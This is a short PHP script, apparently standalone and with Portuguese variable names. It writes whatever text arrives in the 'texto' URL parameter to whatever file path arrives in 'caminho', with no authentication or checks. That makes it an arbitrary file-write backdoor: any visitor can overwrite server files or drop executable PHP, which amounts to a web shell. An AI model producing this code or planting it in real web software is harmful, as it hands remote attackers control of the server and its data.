<?php 
    
    $caminho = $_GET['caminho'];
    $texto = $_GET['texto'];
    
    $source = fopen($caminho, "w");
    fwrite($source, $texto);
    fclose($source);
?>
